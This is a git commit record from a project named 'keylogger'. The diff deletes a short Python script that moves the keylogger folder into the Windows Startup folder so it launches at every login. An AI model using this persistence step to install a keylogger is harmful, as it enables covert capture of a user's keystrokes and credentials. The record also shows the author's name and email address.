c1a7259fa12375a0e4340b0d593c36ab3389013c
AntonioNDev <antonionikoloski2003@gmail.com>
2023-08-15 14:06:25 +0200

    pathF

--- keylogger/main/move.py
+++
@@ -1,9 +0,0 @@
-import shutil 
-
-
-original = r'C:\Users\pcuser\Desktop\keylogger'
-target = r'C:\Users\pcuser\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
-
-shutil.move(original,target)
-
-print ""
